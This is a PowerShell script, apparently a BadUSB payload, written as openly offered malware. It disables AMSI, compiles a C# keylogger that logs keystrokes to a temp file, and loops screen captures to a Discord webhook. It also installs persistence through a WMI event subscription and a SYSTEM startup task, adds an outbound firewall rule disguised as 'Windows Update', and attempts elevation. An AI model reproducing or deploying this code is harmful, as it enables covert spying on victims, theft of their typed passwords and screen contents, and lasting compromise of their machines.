# AMSI Bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# Discord Webhook URL
$webhookUrl = "YOUR_DISCORD_WEBHOOK_URL_HERE"

# Install Missing Plugins/Software
function Install-RequiredSoftware {
    # Check if .NET Framework is installed
    if (-not (Get-Command "dotnet" -ErrorAction SilentlyContinue)) {
        Write-Output "Installing .NET Framework..."
        Invoke-WebRequest -Uri "https://dotnet.microsoft.com/download/dotnet-core/scripts/v1/dotnet-install.ps1" -OutFile "$env:temp\dotnet-install.ps1"
        Invoke-Expression "$env:temp\dotnet-install.ps1 -Channel Current"
    }

    # Check if PowerShellGet module is installed
    if (-not (Get-Module -ListAvailable -Name PowerShellGet)) {
        Write-Output "Installing PowerShellGet module..."
        Install-PackageProvider -Name NuGet -Force
        Install-Module -Name PowerShellGet -Force -AllowClobber
    }

    # Check if WebClient is available
    if (-not (Get-Command "Invoke-WebRequest" -ErrorAction SilentlyContinue)) {
        Write-Output "Installing WebClient..."
        Install-WindowsFeature -Name Web-Client
    }
}

# Keylogger Function
function Start-Keylogger {
    $keyloggerScript = @"
    using System;
    using System.Diagnostics;
    using System.Runtime.InteropServices;
    using System.Windows.Forms;
    public class Keylogger {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static string logFile = "$env:temp\\keylog.txt";

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        public static void Main() {
            _hookID = SetHook(_proc);
            Application.Run();
            UnhookWindowsHookEx(_hookID);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc) {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule) {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
                int vkCode = Marshal.ReadInt32(lParam);
                string key = ((Keys)vkCode).ToString();
                System.IO.File.AppendAllText(logFile, key + Environment.NewLine);
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
    }
"@
    Add-Type -TypeDefinition $keyloggerScript
    [Keylogger]::Main()
}

# Screen Sharing Function
function Start-ScreenShare {
    $screenShareScript = @"
    using System;
    using System.Drawing;
    using System.Drawing.Imaging;
    using System.IO;
    using System.Net;
    using System.Threading;
    public class ScreenShare {
        private static string webhookUrl = "$webhookUrl";
        private static int interval = 5000; // 5 seconds

        public static void Main() {
            while (true) {
                try {
                    using (Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)) {
                        using (Graphics g = Graphics.FromImage(bmp)) {
                            g.CopyFromScreen(0, 0, 0, 0, bmp.Size);
                        }
                        using (MemoryStream ms = new MemoryStream()) {
                            bmp.Save(ms, ImageFormat.Jpeg);
                            byte[] imageBytes = ms.ToArray();
                            string base64Image = Convert.ToBase64String(imageBytes);
                            SendToDiscord(base64Image);
                        }
                    }
                } catch { }
                Thread.Sleep(interval);
            }
        }

        private static void SendToDiscord(string base64Image) {
            string jsonPayload = "{\"content\":\"Screenshot\",\"embeds\":[{\"image\":{\"url\":\"data:image/jpeg;base64," + base64Image + "\"}}]}";
            using (WebClient client = new WebClient()) {
                client.Headers.Add("Content-Type", "application/json");
                client.UploadString(webhookUrl, "POST", jsonPayload);
            }
        }
    }
"@
    Add-Type -TypeDefinition $screenShareScript
    [ScreenShare]::Main()
}

# WMI Event Subscription for Persistence
$wmiScript = @"
$filterArgs = @{
    EventNamespace = 'root/cimv2'
    Name = 'BadUSB_Filter'
    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LogonSession'"
    QueryLanguage = 'WQL'
}
$filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $filterArgs

$consumerArgs = @{
    Name = 'BadUSB_Consumer'
    CommandLineTemplate = "powershell -ExecutionPolicy Bypass -File $env:temp\\payload.ps1"
}
$consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $consumerArgs

$bindingArgs = @{
    Filter = $filter
    Consumer = $consumer
}
Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $bindingArgs
"@
Invoke-Expression $wmiScript

# Firewall Bypass
New-NetFirewallRule -DisplayName "Windows Update" -Direction Outbound -Action Allow -Program "powershell.exe"

# UAC Bypass
$uacBypassScript = @"
Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File $env:temp\\payload.ps1" -Verb RunAs
"@
Invoke-Expression $uacBypassScript

# Automatic Restart on Shutdown/Reboot
$restartScript = @"
$taskName = "BadUSB_Restart"
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File $env:temp\\payload.ps1"
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -User "SYSTEM" -RunLevel Highest
"@
Invoke-Expression $restartScript

# Install Required Software
Install-RequiredSoftware

# Start Keylogger and Screen Sharing
Start-Keylogger
Start-ScreenShare